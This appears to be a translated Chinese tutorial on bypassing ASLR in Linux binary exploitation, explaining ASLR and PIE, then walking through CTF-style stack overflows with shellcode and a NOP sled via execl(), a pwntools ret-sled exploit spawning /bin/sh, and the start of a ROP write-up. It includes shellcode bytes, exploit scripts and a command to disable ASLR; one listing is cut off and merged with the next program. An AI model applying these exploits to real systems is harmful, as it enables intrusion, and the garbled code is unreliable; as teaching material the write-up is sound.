# 如何绕过ASLR
##### 译文声明
本文是翻译文章
译文仅供参考，具体内容表达以及含义原文为准。
## 前言
在开始介绍如何绕过aslr的技术之前，先说一下aslr和pie的区别。因为刚开始接触这一块时，我看网上好多帖子都将两者混为一谈。
###  ASLR
ASLR 不负责代码段以及数据段的随机化工作，这项工作由 PIE 负责。但是只有在开启 ASLR 之后，PIE 才会生效。
Linux下的ASLR总共有3个级别，0、1、2
  * 0就是关闭ASLR，没有随机化，堆栈基地址每次都相同，而且libc.so每次的地址也相同。
  * 1是普通的ASLR。mmap基地址、栈基地址、.so加载基地址都将被随机化，但是堆没用随机化
2是增强的ASLR，增加了堆随机化
可以使用`cat /proc/sys/kernel/randomize_va_space`查看是否开启了aslr
关闭aslr：`echo 0 >/proc/sys/kernel/randomize_va_space`
###  PIE
PIE叫做代码部分地址无关，PIE能使程序像共享库一样在主存任何位置装载，这需要将程序编译成位置无关，并链接为ELF共享对象。如果不开启PIE的话，那么每次ELF文件加载的地址都是相同的。如果开启PIE，那么每次都会不同。
下面给大家演示一下aslr的效果：
测试代码：
    #include
    int main(int argc,char *argv[])
    {
    char buffer[50];
    printf("buffer is at %pn",&buffer);
    if(argc>1)
    strcpy(buffer,argv[1]);
    return 0;
      }
效果如图：
libc加载的基地址和堆栈空间都在变化
## 类型一：没有开启栈不可执行
当没有开始NX的时候，自然而然想到shellcode。但是由于系统开启了aslr,在内存布局随机化排列时，攻击者不能将执行权返回正在等待的shellcode。
这里可以借助execl()函数。
execl()函数声明如下：
extern int execl(_const char __path,const char_ _argv[],…,NULL)
简单解释：函数execl()返回值定义为整形，如果执行成功将不返回！执行失败返回-1。
参数列表中char
*_path为所要执行的文件的绝对路径，从第二个参数argv开始为执行新的文件所需的参数，最后一个参数必须是控指针（我为了简便用NULL代替）。
先给大家演示一下效果：
    #include
    #include
    int main(int argc,char *argv[])
    {
    int stack_var;
    printf("stack_var is at %pn",&stack_var);
    execl("./aslr_demo","aslr_demo",NULL);
    }
虽然excel（）在执行新进程时，会有一定的程度的随机排列的发生，但是使用execl（）至少可以限制随机性，为我们提供活动地址的范围，余下不确定性可以用nop填充。
前面的aslr_demo程序存在明显的栈溢出，没有限制参数的大小，这里就以这个例子为例。经过测试溢出点为80，因为比较简单，直接给出exp：
    #include
    #include
    #include
    unsigned char shellcode[]="xb0x46x31xdbx31xc9xcdx80x68x90x90x90x68x5bxc1xebx10xc1xebx08x53x68x2fx62x61x73x68x2fx62x69x6ex89xe3x31xc0xb0x0bxcdx80xb0x01xb3x01xcdx80";;
    int main(int argc,char *argv[]){
      unsigned int i,ret,offest;
      char buffer[1000];
      printf("i is at %pn",&i);
      if(argc>1)
      offest =atoi(argv[1]);
      ret =(unsigned int)&i-offest+200;
      printf("ret addr is %pn",ret);
      for(i=0;i
    #include 
    int call(){
      return system("/bin/sh");
    }
    int main(){
      char buf[400];
      fgets(buf,405,stdin);
      printf("%s",buf);
      printf("%d",strlen(buf));
    }
编译时加上参数m32
代码如上，这是某个比赛的题目，但是在编写文档之前，找了很久也没有找到，就模仿它的思想，写了一个类似的程序，为了方便演示，直接给出了后门函数call（）。
这个题还有点小坑，因为是在我自己16.04.2-Ubuntu版本上编译的，我的gcc版本是5.4.，gcc高版本中做了优化，而且经过测试，只对32位程序有效。所以大家在测试的时候加上m32参数。
大家注意一下细节，esp中的值是由ecx决定的，
mov ecx,DWORD PTR [ebp-0x4]
lea esp,[ecx-0x4]
也就是说你无法像常规那种直接控制返回地址，只能间接的去控制ecx来控制esp。
查看一下文件保护：
还有一个坑，就是我在源程序中，buf缓冲区给了400的空间，但是fgets（）函数只能读入405个字节，看似是个溢出点，但是根本覆盖不了返回值，也不能覆盖ecx。但是魔高一尺，道高一丈，还是有办法的。
先贴出exp：
    from pwn import *
    context.log_level = 'debug'
    ret = p32(0x0804833a)
    system = p32(0x080484cb)
    r= process('./buf1')
    context.terminal = ['gnome-terminal', '-x', 'sh', '-c']
    gdb.attach(proc.pidof(r)[0])
    shellcode = ret*100+ system
    print len(shellcode)
    r.sendline(shellcode)
    r.interactive()
通过调试可以发现，ecx的低二位被覆盖为00，导致堆栈被抬高至填充有ret覆盖的地址上去，执行完填充的大量ret之后，直接system函数拿到shell。
但是为什么ecx低二位会被覆盖的，罪魁祸首是fgets()函数。这个函数会在字符串末位填充一个字符放结束符x00.
其实这个题的原理和上面讲的那个shellcode原理大同小异。控制eip转到esp指向的地址，开启了aslr无法预知到准确地址，用nop填充即可，可以增加实现的几率。
成功拿到shell
## 类型三：构造ROP链
这是一道今年六一的时候去武汉参加全国大学生信息安全竞赛（华中赛区）的一道题目
[题目下载](https://pan.baidu.com/s/1qFlr0zRBoZFyBxx8HzA_CA)
提取码：krxy
## 题目内容
先看开了什么保护，做到心中有数。
日常放入ida，在加密函数内，可以很容易的找到溢出的，数组s大小只有48，但是却用了gets函数来接收输入，并且没有限制输入长度，导致溢出。
## 思路：
  * 利用gets函数溢出覆盖返回值，构造rop
  * 利用puts函数leak
得到libc基址，调用system（）函数拿shell
####  简单介绍一下rop：简单介绍一下rop：
ROP全称为Return-oriented
Programming（面向返回的编程）是一种新型的基于代码复用技术的攻击，攻击者从已有的库或可执行文件中提取指令片段，构建恶意代码。ROP攻击同缓冲区溢出攻击，格式化字符串漏洞攻击不同，是一种全新的攻击方式,它利用代码复用技术。